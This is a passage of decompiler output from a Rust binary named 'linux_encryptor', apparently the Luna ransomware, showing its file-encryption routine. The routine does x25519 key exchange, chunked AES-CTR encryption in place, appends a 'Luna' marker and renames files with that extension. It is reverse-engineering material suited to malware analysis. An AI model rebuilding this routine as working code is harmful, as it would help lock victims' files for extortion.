/* WARNING: Function: __rust_probestack replaced with injection: __rust_probestack */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void _ZN15linux_encryptor5files8add_file17h9f8ecb31ebca83c0E(undefined8 *param_1)

{
  code *pcVar1;
  ulong uVar2;
  undefined auVar3 [16];
  undefined auVar4 [16];
  undefined *puVar5;
  undefined uVar6;
  undefined8 uVar7;
  undefined8 **ppuVar8;
  undefined8 **__ptr;
  undefined8 **__ptr_00;
  undefined8 **ppuVar9;
  undefined8 **ppuVar10;
  ulong uVar11;
  long lVar13;
  ulong uVar14;
  undefined auVar15 [16];
  undefined4 local_1254;
  undefined8 **local_1250;
  undefined8 **local_1248;
  undefined8 **local_1230;
  undefined8 uStack_1228;
  undefined8 uStack_1220;
  undefined8 *local_1208;
  undefined8 local_1200;
  undefined8 *local_11f8;
  undefined8 **local_11f0;
  ulong local_11e8;
  undefined8 **local_11e0;
  undefined8 uStack_11d8;
  undefined8 local_11d0;
  undefined8 uStack_11c8;
  undefined8 local_11c0;
  undefined8 uStack_11b8;
  undefined8 local_11b0;
  undefined8 uStack_11a8;
  undefined8 *local_1198;
  undefined8 local_1190;
  undefined8 **ppuStack_1188;
  undefined8 **local_1180;
  undefined8 uStack_1178;
  undefined8 local_1170;
  undefined8 uStack_1168;
  undefined8 local_1160;
  undefined8 uStack_1158;
  undefined4 local_1150;
  undefined4 uStack_114c;
  undefined4 uStack_1148;
  undefined4 uStack_1144;
  undefined4 local_1140;
  undefined4 uStack_113c;
  undefined4 uStack_1138;
  undefined4 uStack_1134;
  long local_10b8;
  undefined4 local_10b0;
  undefined4 uStack_10ac;
  undefined4 uStack_10a8;
  undefined4 uStack_10a4;
  undefined4 local_10a0;
  undefined4 uStack_109c;
  undefined4 uStack_1098;
  undefined4 uStack_1094;
  undefined local_1090 [32];
  undefined8 **local_1070;
  undefined8 **ppuStack_1068;
  undefined8 **local_1060;
  undefined8 uStack_1058;
  undefined8 ***local_1050;
  undefined8 uStack_1048;
  undefined local_1040 [4096];
  undefined2 local_40;
  undefined8 uStack_38;
  undefined8 *puVar12;
  
  uStack_38 = 0x109f84;
  local_11f8 = param_1;
  (*(code *)PTR_options_00177738)(&local_11c0);
  uVar7 = (*(code *)PTR_read_00177878)(&local_11c0,1);
  uVar7 = (*(code *)PTR_write_00177c18)(uVar7,1);
  (*(code *)PTR__open_00177f48)(&local_1190,uVar7,*param_1,param_1[2]);
  if ((int)local_1190 != 0) {
    local_1230 = ppuStack_1188;
    switch((uint)ppuStack_1188 & 3) {
    case 0:
      uVar6 = *(undefined *)(ppuStack_1188 + 2);
      break;
    case 1:
      uVar6 = *(undefined *)((long)ppuStack_1188 + 0xf);
      break;
    case 2:
                    /* try { // try from 0010a586 to 0010a626 has its CatchHandler @ 0010b645 */
      uVar6 = (*(code *)PTR_decode_error_kind_00177a30)((ulong)ppuStack_1188 >> 0x20);
      break;
    case 3:
      if ((uint)((ulong)ppuStack_1188 >> 0x20) < 0x29) {
                    /* WARNING: Could not recover jumptable at 0x0010a5ad. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        (*(code *)(&DAT_00153040 + *(int *)(&DAT_00153040 + ((ulong)ppuStack_1188 >> 0x20) * 4)))();
        return;
      }
      uVar6 = 0x29;
    }
    local_1250 = (undefined8 **)CONCAT71(local_1250._1_7_,uVar6);
    local_1170 = &local_1250;
    uStack_1168 = std::io::error::fmt;
    local_1070 = (undefined8 **)&PTR_s_Error_while_opening_file__00173f00;
    ppuStack_1068 = (undefined8 **)0x2;
    local_1060 = (undefined8 **)0x0;
    local_1050 = (undefined8 ***)&local_1170;
    uStack_1048 = 1;
    (*(code *)PTR__print_00177f40)(&local_1070);
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&local_1230);
    return;
  }
  local_1254 = local_1190._4_4_;
                    /* try { // try from 0010a014 to 0010a026 has its CatchHandler @ 0010b674 */
  (*(code *)PTR_metadata_00177ed0)(&local_1070,&local_1254);
  if (local_1070 != (undefined8 **)0x0) {
    local_1170 = (undefined8 ***)ppuStack_1068;
                    /* try { // try from 0010b15c to 0010b183 has its CatchHandler @ 0010b619 */
    (*(code *)PTR_unwrap_failed_00177f80)
              ("called `Result::unwrap()` on an `Err` value",0x2b,&local_1170,
               &
               PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
               ,&PTR_s_src_files_rs_00173f20);
    goto LAB_0010b40f;
  }
  (*(code *)PTR_memcpy_00177fa8)(&local_1170,&ppuStack_1068,0xb0);
                    /* try { // try from 0010a054 to 0010a0c3 has its CatchHandler @ 0010b674 */
  ppuVar8 = (undefined8 **)(*(code *)PTR_len_00177d70)(&local_1170);
  local_11b0 = 0;
  uStack_11a8 = 0;
  local_11c0 = (undefined8 **)0x0;
  uStack_11b8 = (undefined8 **)0x0;
  (*(code *)
    PTR__ZN59__LT_rand_core__os__OsRng_u20_as_u20_rand_core__RngCore_GT_10fill_bytes17h05d0c8f222479ec2E_00177c60
  )(&local_1190,&local_11c0,0x20);
  local_1060 = (undefined8 **)local_11b0;
  uStack_1058 = uStack_11a8;
  local_1070 = local_11c0;
  ppuStack_1068 = uStack_11b8;
  (*(code *)PTR__ZN12x25519_dalek6x2551912clamp_scalar17hc83d8d312a5ba984E_00177880)
            (&local_1170,&local_1070);
  local_10b0 = (undefined4)local_1170;
  uStack_10ac = local_1170._4_4_;
  uStack_10a8 = (undefined4)uStack_1168;
  uStack_10a4 = uStack_1168._4_4_;
  local_10a0 = (undefined4)local_1160;
  uStack_109c = local_1160._4_4_;
  uStack_1098 = (undefined4)uStack_1158;
  uStack_1094 = uStack_1158._4_4_;
                    /* try { // try from 0010a0e4 to 0010a0f9 has its CatchHandler @ 0010b657 */
  (*(code *)
    PTR__ZN120__LT_x25519_dalek__x25519__PublicKey_u20_as_u20_core__convert__From_LT__RF_x25519_dalek__x25519__EphemeralSecret_GT__GT_4from17he281c90061a388daE_00177a18
  )(local_1090,&local_10b0);
  local_11d0 = 0;
  uStack_11c8 = 0;
  local_11e0 = (undefined8 **)0x0;
  uStack_11d8 = 0;
  (*(code *)PTR_memset_00177770)(local_1040,0,0x1000);
  local_1070 = (undefined8 **)0x15323d;
  ppuStack_1068 = (undefined8 **)0x2c;
  local_40 = 0;
  local_1060 = (undefined8 **)0x0;
  uStack_1058 = 0;
  local_1050 = (undefined8 ***)0x0;
  uStack_1048 = 0;
                    /* try { // try from 0010a15a to 0010a1d5 has its CatchHandler @ 0010b657 */
  _ZN98__LT_base64_stream__from_base64_reader__FromBase64Reader_LT_R_C_N_GT__u20_as_u20_std__io__Read_GT_4read17hb3c702596d042c13E
            (&local_1170,&local_1070,&local_11e0,0x20);
  if (local_1170 != (undefined8 ***)0x0) {
    local_11c0 = (undefined8 **)uStack_1168;
                    /* try { // try from 0010b199 to 0010b1c0 has its CatchHandler @ 0010b5ff */
    (*(code *)PTR_unwrap_failed_00177f80)
              ("called `Result::unwrap()` on an `Err` value",0x2b,&local_11c0,
               &
               PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
               ,&PTR_s_src_files_rs_00173ee8);
    goto LAB_0010b40f;
  }
  local_1160 = (undefined8 **)local_11d0;
  uStack_1158 = uStack_11c8;
  local_1170 = (undefined8 ***)local_11e0;
  uStack_1168 = (code *)uStack_11d8;
  (*(code *)
    PTR__ZN103__LT_x25519_dalek__x25519__PublicKey_u20_as_u20_core__convert__From_LT__u5b_u8_u3b__u20_32_u5d__GT__GT_4from17h7cab22afea86b4bcE_00177728
  )(&local_1250,&local_1170);
  (*(code *)PTR__ZN12x25519_dalek6x2551912StaticSecret14diffie_hellman17h67523ff67070ee4aE_00177910)
            (&local_1230,&local_10b0,&local_1250);
                    /* try { // try from 0010a1d6 to 0010a1fe has its CatchHandler @ 0010b636 */
  (*(code *)
    PTR__ZN16curve25519_dalek10montgomery15MontgomeryPoint8to_bytes17h16a036e8efe08c9eE_00177d98)
            (&local_1190,&local_1230);
  (*(code *)
    PTR__ZN16curve25519_dalek10montgomery15MontgomeryPoint8to_bytes17h16a036e8efe08c9eE_00177d98)
            (&local_11c0,local_1090);
  local_1160 = local_1180;
  uStack_1158 = uStack_1178;
  local_1170 = (undefined8 ***)local_1190;
  uStack_1168 = (code *)ppuStack_1188;
  local_1150 = (undefined4)local_11c0;
  uStack_114c = local_11c0._4_4_;
  uStack_1148 = (undefined4)uStack_11b8;
  uStack_1144 = uStack_11b8._4_4_;
  local_1140 = (undefined4)local_11b0;
  uStack_113c = local_11b0._4_4_;
  uStack_1138 = (undefined4)uStack_11a8;
  uStack_1134 = uStack_11a8._4_4_;
                    /* try { // try from 0010a23f to 0010a249 has its CatchHandler @ 0010b657 */
  (*(code *)
    PTR__ZN12x25519_dalek6x2551940_DERIVE_zeroize_Zeroize_FOR_SharedSecret81__LT_impl_u20_zeroize__Zeroize_u20_for_u20_x25519_dalek__x25519__SharedSecret_GT_7zeroize17h6df515ff054eb0e3E_00177b88
  )(&local_1230);
                    /* try { // try from 0010a24a to 0010a2bb has its CatchHandler @ 0010b674 */
  (*(code *)
    PTR__ZN12x25519_dalek6x2551932_DERIVE_Drop_FOR_EphemeralSecret89__LT_impl_u20_core__ops__drop__Drop_u20_for_u20_x25519_dalek__x25519__EphemeralSecret_GT_4drop17h5ad457619b311fecE_00177e38
  )(&local_10b0);
  local_1180 = local_1160;
  uStack_1178 = uStack_1158;
  local_1190 = local_1170;
  ppuStack_1188 = (undefined8 **)uStack_1168;
  local_11b0 = CONCAT44(uStack_113c,local_1140);
  uStack_11a8 = CONCAT44(uStack_1134,uStack_1138);
  local_11c0 = (undefined8 **)CONCAT44(uStack_114c,local_1150);
  uStack_11b8 = (undefined8 **)CONCAT44(uStack_1144,uStack_1148);
  auVar15 = (*(code *)PTR__ZN6crypto3aes3ctr17h515350042bdb7574E_00177db0)
                      (2,&local_1190,0x20,"Luna",4);
  puVar12 = auVar15._8_8_;
  uVar7 = auVar15._0_8_;
  uVar2 = ((ulong)ppuVar8 / 0x50000) * 0x1e;
  local_11f0 = ppuVar8;
  local_1198 = param_1;
  local_1090._0_16_ = auVar15;
  if (uVar2 < 0xeac4) {
    if ((99 < uVar2) && (99 < (ushort)((ushort)uVar2 - 100))) {
      uVar14 = (ulong)((uint)((uVar2 & 0xffff) >> 2) / 0x19);
      uVar11 = uVar14 - 1;
      if (uVar11 == 0) {
        local_1208 = puVar12;
        local_1200 = uVar7;
        local_1090._0_8_ = uVar7;
        local_1090._8_8_ = puVar12;
                    /* try { // try from 0010b059 to 0010b071 has its CatchHandler @ 0010b6e7 */
        (*(code *)PTR_panic_00177a90)("attempt to divide by zero",0x19,&PTR_s_src_files_rs_00173f38)
        ;
        goto LAB_0010b40f;
      }
      if (99 < (ushort)uVar2) {
        ppuVar8 = ppuVar8 + uVar14 * -0xa000;
        if (((ulong)ppuVar8 | uVar11) >> 0x20 == 0) {
          local_11e8 = ((ulong)ppuVar8 & 0xffffffff) / (uVar11 & 0xffffffff);
        }
        else {
          local_11e8 = (ulong)ppuVar8 / uVar11;
        }
        lVar13 = uVar14 - 1;
        if (lVar13 != 0) goto LAB_0010a338;
      }
      goto LAB_0010ab71;
    }
    if ((undefined8 **)0x4ffff < ppuVar8) {
      ppuVar8 = (undefined8 **)(*(code *)PTR___rust_alloc_00177c88)(0x50000,1);
      if (ppuVar8 == (undefined8 **)0x0) {
                    /* try { // try from 0010b240 to 0010b24f has its CatchHandler @ 0010b550 */
        (*(code *)PTR_handle_alloc_error_00177ae0)(0x50000,1);
        goto LAB_0010b40f;
      }
      local_1230 = ppuVar8;
      (*(code *)PTR_memset_00177770)(ppuVar8,0,0x50000);
      uStack_1228 = (undefined8 **)CONCAT44(_UNK_00153004,_DAT_00153000);
      uStack_1220 = (undefined8 **)CONCAT44(_UNK_0015300c,_UNK_00153008);
      ppuVar9 = (undefined8 **)(*(code *)PTR___rust_alloc_00177c88)(0x50000,1);
      if (ppuVar9 == (undefined8 **)0x0) {
                    /* try { // try from 0010b255 to 0010b264 has its CatchHandler @ 0010b548 */
        (*(code *)PTR_handle_alloc_error_00177ae0)(0x50000,1);
        goto LAB_0010b40f;
      }
      local_1170 = (undefined8 ***)ppuVar9;
      (*(code *)PTR_memset_00177770)(ppuVar9,0,0x50000);
      uStack_1168 = (code *)CONCAT44(_UNK_00153004,_DAT_00153000);
      local_1160 = (undefined8 **)CONCAT44(_UNK_0015300c,_UNK_00153008);
      local_1070 = (undefined8 **)0x0;
      ppuStack_1068 = (undefined8 **)0x0;
                    /* try { // try from 0010a7f9 to 0010a8ac has its CatchHandler @ 0010b5e2 */
      (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
      if (local_1250 != (undefined8 **)0x0) {
        local_1070 = local_1248;
                    /* try { // try from 0010b2b1 to 0010b2d8 has its CatchHandler @ 0010b50e */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153010,0x10,&local_1070,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00174000);
        goto LAB_0010b40f;
      }
      (*(code *)PTR_read_00177760)(&local_1070,&local_1254,ppuVar8,0x50000);
      if (local_1070 != (undefined8 **)0x0) {
        local_1250 = ppuStack_1068;
                    /* try { // try from 0010b322 to 0010b346 has its CatchHandler @ 0010b4da */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153020,0x10,&local_1250,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00174018);
        goto LAB_0010b40f;
      }
      (*(code *)puVar12[3])(uVar7,ppuVar8,0x50000,ppuVar9,0x50000);
      local_1070 = (undefined8 **)0x0;
      ppuStack_1068 = (undefined8 **)0x0;
      (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
      if (local_1250 != (undefined8 **)0x0) {
        local_1070 = local_1248;
                    /* try { // try from 0010b393 to 0010b3ba has its CatchHandler @ 0010b4a0 */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153010,0x10,&local_1070,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00174030);
        goto LAB_0010b40f;
      }
      (*(code *)PTR_send_00177bd0)(&local_11e0,&local_1254,ppuVar9,0x50000);
      if (local_11e0 != (undefined8 **)0x0) {
        local_1250 = &local_11f8;
        local_1248 = (undefined8 **)
                     _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
        local_1070 = (undefined8 **)&PTR_s_Error_while_writing_encrypted_da_00173f98;
        ppuStack_1068 = (undefined8 **)0x2;
        local_1060 = (undefined8 **)0x0;
        uStack_1048 = 1;
                    /* try { // try from 0010a90d to 0010a91a has its CatchHandler @ 0010b469 */
        local_1050 = &local_1250;
        (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010a923 to 0010a927 has its CatchHandler @ 0010b45f */
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_11d8);
        std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar9);
        std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar8);
        goto LAB_0010aefd;
      }
      local_1208 = puVar12;
      local_1200 = uVar7;
      std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar9);
      std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar8);
      auVar15._8_8_ = local_1208;
      auVar15._0_8_ = local_1200;
      goto LAB_0010ab71;
    }
    if (ppuVar8 == (undefined8 **)0x0) {
      local_1230 = (undefined8 **)&DAT_00000001;
      uStack_1228 = (undefined8 **)0x0;
      uStack_1220 = (undefined8 **)0x0;
      local_1170 = (undefined8 ***)&DAT_00000001;
      uStack_1168 = (code *)0x0;
      local_1160 = (undefined8 **)0x0;
      ppuVar9 = (undefined8 **)&DAT_00000001;
      ppuVar10 = (undefined8 **)&DAT_00000001;
    }
    else {
      ppuVar9 = (undefined8 **)(*(code *)PTR___rust_alloc_00177c88)(ppuVar8,1);
      if (ppuVar9 == (undefined8 **)0x0) {
                    /* try { // try from 0010b3bd to 0010b3ca has its CatchHandler @ 0010b49b */
        (*(code *)PTR_handle_alloc_error_00177ae0)(ppuVar8,1);
        goto LAB_0010b40f;
      }
      local_1230 = ppuVar9;
      uStack_1228 = ppuVar8;
      (*(code *)PTR_memset_00177770)(ppuVar9,0,ppuVar8);
      uStack_1220 = ppuVar8;
      ppuVar10 = (undefined8 **)(*(code *)PTR___rust_alloc_00177c88)(ppuVar8,1);
      if (ppuVar10 == (undefined8 **)0x0) {
                    /* try { // try from 0010b3cd to 0010b3da has its CatchHandler @ 0010b493 */
        (*(code *)PTR_handle_alloc_error_00177ae0)(ppuVar8,1);
        goto LAB_0010b40f;
      }
      local_1170 = (undefined8 ***)ppuVar10;
      uStack_1168 = (code *)ppuVar8;
      (*(code *)PTR_memset_00177770)(ppuVar10,0,ppuVar8);
      local_1160 = ppuVar8;
    }
    local_1070 = (undefined8 **)0x0;
    ppuStack_1068 = (undefined8 **)0x0;
                    /* try { // try from 0010a998 to 0010aa44 has its CatchHandler @ 0010b5e7 */
    (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
    if (local_1250 != (undefined8 **)0x0) {
      local_1070 = local_1248;
                    /* try { // try from 0010b277 to 0010b29e has its CatchHandler @ 0010b52b */
      (*(code *)PTR_unwrap_failed_00177f80)
                (&DAT_00153010,0x10,&local_1070,
                 &
                 PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                 ,&PTR_s_src_files_rs_00173fb8);
      goto LAB_0010b40f;
    }
    (*(code *)PTR_read_00177760)(&local_1070,&local_1254,ppuVar9,ppuVar8);
    if (local_1070 != (undefined8 **)0x0) {
      local_1250 = ppuStack_1068;
                    /* try { // try from 0010b2eb to 0010b30f has its CatchHandler @ 0010b4f4 */
      (*(code *)PTR_unwrap_failed_00177f80)
                (&DAT_00153020,0x10,&local_1250,
                 &
                 PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                 ,&PTR_s_src_files_rs_00173fd0);
      goto LAB_0010b40f;
    }
    (*(code *)puVar12[3])(uVar7,ppuVar9,ppuVar8,ppuVar10,ppuVar8);
    local_1070 = (undefined8 **)0x0;
    ppuStack_1068 = (undefined8 **)0x0;
    (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
    if (local_1250 != (undefined8 **)0x0) {
      local_1070 = local_1248;
                    /* try { // try from 0010b359 to 0010b380 has its CatchHandler @ 0010b4bd */
      (*(code *)PTR_unwrap_failed_00177f80)
                (&DAT_00153010,0x10,&local_1070,
                 &
                 PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                 ,&PTR_s_src_files_rs_00173fe8);
      goto LAB_0010b40f;
    }
    (*(code *)PTR_send_00177bd0)(&local_11e0,&local_1254,ppuVar10,local_11f0);
    if (local_11e0 == (undefined8 **)0x0) {
      if (local_11f0 != (undefined8 **)0x0) {
        local_1208 = puVar12;
        local_1200 = uVar7;
        std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar10);
        std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar9);
        auVar15._8_8_ = local_1208;
        auVar15._0_8_ = local_1200;
      }
      goto LAB_0010ab71;
    }
    local_1250 = &local_11f8;
    local_1248 = (undefined8 **)
                 _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
    local_1070 = (undefined8 **)&PTR_s_Error_while_writing_encrypted_da_00173f98;
    ppuStack_1068 = (undefined8 **)0x2;
    local_1060 = (undefined8 **)0x0;
    uStack_1048 = 1;
                    /* try { // try from 0010aaa5 to 0010aab2 has its CatchHandler @ 0010b47e */
    local_1050 = &local_1250;
    (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010aabb to 0010aabf has its CatchHandler @ 0010b464 */
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_11d8);
    if (local_11f0 != (undefined8 **)0x0) {
      std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar10);
      std::alloc::__default_lib_allocator::__rust_dealloc(ppuVar9);
    }
  }
  else {
    local_11e8 = (ulong)(ppuVar8 + -0x1770000) / 599;
    lVar13 = 599;
LAB_0010a338:
    local_11e8 = local_11e8 + 0x50000;
    ppuVar8 = (undefined8 **)0x0;
    do {
      puVar5 = PTR_memset_00177770;
      local_1208 = auVar15._8_8_;
      local_1200 = auVar15._0_8_;
      local_10b8 = lVar13;
      std::alloc::__default_lib_allocator::__rust_alloc();
      if (__ptr == (undefined8 **)0x0) {
                    /* try { // try from 0010b0ae to 0010b0bd has its CatchHandler @ 0010b6b2 */
        (*(code *)PTR_handle_alloc_error_00177ae0)(0x50000,1);
        goto LAB_0010b40f;
      }
      local_1230 = __ptr;
      (*(code *)puVar5)(__ptr,0,0x50000);
      uStack_1228 = (undefined8 **)CONCAT44(_UNK_00153004,_DAT_00153000);
      uStack_1220 = (undefined8 **)CONCAT44(_UNK_0015300c,_UNK_00153008);
      std::alloc::__default_lib_allocator::__rust_alloc();
      if (__ptr_00 == (undefined8 **)0x0) {
                    /* try { // try from 0010b0c3 to 0010b0d2 has its CatchHandler @ 0010b6ad */
        (*(code *)PTR_handle_alloc_error_00177ae0)(0x50000,1);
        goto LAB_0010b40f;
      }
      local_1170 = (undefined8 ***)__ptr_00;
      (*(code *)puVar5)(__ptr_00,0,0x50000);
      uStack_1168 = (code *)CONCAT44(_UNK_00153004,_DAT_00153000);
      local_1160 = (undefined8 **)CONCAT44(_UNK_0015300c,_UNK_00153008);
      local_1070 = (undefined8 **)0x0;
                    /* try { // try from 0010a3ee to 0010a49e has its CatchHandler @ 0010b6cb */
      ppuStack_1068 = ppuVar8;
      (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
      if (local_1250 != (undefined8 **)0x0) {
        local_1070 = local_1248;
                    /* try { // try from 0010b0e5 to 0010b10c has its CatchHandler @ 0010b693 */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153010,0x10,&local_1070,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00173f50);
        goto LAB_0010b40f;
      }
      (*(code *)PTR_read_00177760)(&local_1070,&local_1254,__ptr,0x50000);
      if (local_1070 != (undefined8 **)0x0) {
        local_1250 = ppuStack_1068;
                    /* try { // try from 0010b084 to 0010b0a8 has its CatchHandler @ 0010b6b4 */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153020,0x10,&local_1250,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00173f68);
        goto LAB_0010b40f;
      }
      (*(code *)local_1208[3])(local_1200,__ptr,0x50000,__ptr_00,0x50000);
      local_1070 = (undefined8 **)0x0;
      ppuStack_1068 = ppuVar8;
      (*(code *)PTR_seek_00177d90)(&local_1250,&local_1254,&local_1070);
      if (local_1250 != (undefined8 **)0x0) {
        local_1070 = local_1248;
                    /* try { // try from 0010b11f to 0010b146 has its CatchHandler @ 0010b679 */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153010,0x10,&local_1070,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00173f80);
        goto LAB_0010b40f;
      }
      (*(code *)PTR_send_00177bd0)(&local_11e0,&local_1254,__ptr_00,0x50000);
      if (local_11e0 != (undefined8 **)0x0) {
        local_1250 = &local_11f8;
        local_1248 = (undefined8 **)
                     _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h7364595569e6a5abE;
        local_1070 = (undefined8 **)&PTR_s_Error_while_writing_encrypted_da_00173f98;
        ppuStack_1068 = (undefined8 **)0x2;
        local_1060 = (undefined8 **)0x0;
        uStack_1048 = 1;
                    /* try { // try from 0010a687 to 0010a694 has its CatchHandler @ 0010b59e */
        local_1050 = &local_1250;
        (*(code *)PTR__print_00177f40)(&local_1070);
                    /* try { // try from 0010a69d to 0010a6a1 has its CatchHandler @ 0010b599 */
        _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E(&uStack_11d8);
        std::alloc::__default_lib_allocator::__rust_dealloc(__ptr_00);
        std::alloc::__default_lib_allocator::__rust_dealloc(__ptr);
        auVar15._8_8_ = local_1208;
        auVar15._0_8_ = local_1200;
        goto LAB_0010aefd;
      }
      std::alloc::__default_lib_allocator::__rust_dealloc(__ptr_00);
      std::alloc::__default_lib_allocator::__rust_dealloc(__ptr);
      auVar15._8_8_ = local_1208;
      auVar15._0_8_ = local_1200;
      ppuVar8 = (undefined8 **)((long)ppuVar8 + local_11e8);
      lVar13 = local_10b8 + -1;
    } while (lVar13 != 0);
LAB_0010ab71:
    ppuVar8 = local_11f0;
    local_1208 = auVar15._8_8_;
    local_1200 = auVar15._0_8_;
    ppuStack_1068 = local_11f0;
    local_1070 = (undefined8 **)0x0;
                    /* try { // try from 0010ab8a to 0010abdd has its CatchHandler @ 0010b6e7 */
    (*(code *)PTR_seek_00177d90)(&local_1170,&local_1254,&local_1070);
    uVar7 = local_1200;
    puVar12 = local_1208;
    auVar15._8_8_ = local_1208;
    auVar15._0_8_ = local_1200;
    auVar4._8_8_ = local_1208;
    auVar4._0_8_ = local_1200;
    auVar3._8_8_ = local_1208;
    auVar3._0_8_ = local_1200;
    if (local_1170 != (undefined8 ***)0x0) {
      local_1070 = (undefined8 **)uStack_1168;
                    /* try { // try from 0010b1d6 to 0010b1fd has its CatchHandler @ 0010b5c5 */
      (*(code *)PTR_unwrap_failed_00177f80)
                (&DAT_00153010,0x10,&local_1070,
                 &
                 PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                 ,&PTR_s_src_files_rs_00174048);
LAB_0010b40f:
                    /* WARNING: Does not return */
      pcVar1 = (code *)invalidInstructionException();
      (*pcVar1)();
    }
    (*(code *)PTR_send_00177bd0)(&local_1230,&local_1254,&local_11c0,0x20);
    if (local_1230 == (undefined8 **)0x0) {
      ppuStack_1068 = ppuVar8 + 4;
      local_1070 = (undefined8 **)0x0;
      (*(code *)PTR_seek_00177d90)(&local_1170,&local_1254,&local_1070);
      if (local_1170 != (undefined8 ***)0x0) {
        local_1070 = (undefined8 **)uStack_1168;
                    /* try { // try from 0010b213 to 0010b23a has its CatchHandler @ 0010b57c */
        (*(code *)PTR_unwrap_failed_00177f80)
                  (&DAT_00153010,0x10,&local_1070,
                   &
                   PTR__ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h3fc65152347e7263E_00173e70
                   ,&PTR_s_src_files_rs_00174080);
        goto LAB_0010b40f;
      }
      (*(code *)PTR_send_00177bd0)(&local_1230,&local_1254,"Luna",4);
      if (local_1230 == (undefined8 **)0x0) {
        (*(code *)PTR_clone_00177740)(&local_1070,local_1198);
        if (ppuStack_1068 == local_1060) {
                    /* try { // try from 0010ad5f to 0010ad70 has its CatchHandler @ 0010b41b */
          _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
                    (&local_1070,local_1060,1);
        }
        *(undefined *)((long)local_1070 + (long)local_1060) = 0x2e;
        local_1160 = (undefined8 **)((long)local_1060 + 1);
        local_1170 = (undefined8 ***)local_1070;
        uStack_1168 = (code *)ppuStack_1068;
                    /* try { // try from 0010ada1 to 0010adba has its CatchHandler @ 0010b567 */
        (*(code *)PTR_from_utf8_00177ae8)(&local_1070,"Luna",4);
        ppuVar9 = local_1060;
        ppuVar8 = ppuStack_1068;
        if (local_1070 != (undefined8 **)0x0) {
          local_1230 = ppuStack_1068;
          uStack_1228 = local_1060;
                    /* try { // try from 0010b3ea to 0010b40e has its CatchHandler @ 0010b567 */
          (*(code *)PTR_unwrap_failed_00177f80)
                    ("called `Result::unwrap()` on an `Err` value",0x2b,&local_1230,
                     &
                     PTR__ZN4core3ptr46drop_in_place_LT__RF_std__io__error__Error_GT_17h40a085cd5c4345bbE_00173eb0
                     ,&PTR_s_src_files_rs_001740b8);
          goto LAB_0010b40f;
        }
        if ((undefined8 **)((long)uStack_1168 - (long)local_1160) < local_1060) {
                    /* try { // try from 0010adf2 to 0010ae04 has its CatchHandler @ 0010b416 */
          _ZN5alloc7raw_vec19RawVec_LT_T_C_A_GT_7reserve21do_reserve_and_handle17h0efe5460ba49e6e2E
                    (&local_1170,local_1160,local_1060);
        }
        ppuVar10 = local_1160;
        (*(code *)PTR_memcpy_00177fa8)
                  ((undefined *)((long)local_1170 + (long)local_1160),ppuVar8,ppuVar9);
        ppuVar8 = local_1170;
        local_1060 = (undefined8 **)((long)ppuVar10 + (long)ppuVar9);
        local_1070 = local_1170;
        ppuStack_1068 = (undefined8 **)uStack_1168;
                    /* try { // try from 0010ae56 to 0010ae61 has its CatchHandler @ 0010b442 */
        local_1250 = (undefined8 **)
                     (*(code *)PTR_rename_001779c0)(*local_1198,local_1198[2],local_1170,local_1060)
        ;
